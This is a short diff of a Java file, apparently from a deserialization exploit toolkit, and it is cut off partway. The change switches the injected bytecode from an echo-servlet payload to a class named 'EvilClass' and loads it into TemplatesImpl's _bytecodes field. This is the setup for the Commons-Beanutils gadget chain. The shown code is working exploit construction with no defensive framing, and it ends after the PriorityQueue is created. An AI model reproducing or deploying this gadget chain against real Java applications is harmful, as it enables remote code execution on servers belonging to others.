@@ -7,12 +7,12 @@ import java.util.PriorityQueue;
 
 public class CommonsBeanutils {
     public static void main(String[] args) throws Exception{
-//        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");
-        byte[] bytes2 = new Servlet9Echo().getCode();
+        byte[] bytes = Util.getExpClassFileBytes("EvilClass");
+//        byte[] bytes2 = new Servlet9Echo().getCode();
 
         TemplatesImpl templates = new TemplatesImpl();
         Util.setValue(templates, "_name", "v");
-        Util.setValue(templates, "_bytecodes",new byte[][]{bytes2});
+        Util.setValue(templates, "_bytecodes",new byte[][]{bytes});
         Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());
 
         PriorityQueue queue = new PriorityQueue(1);
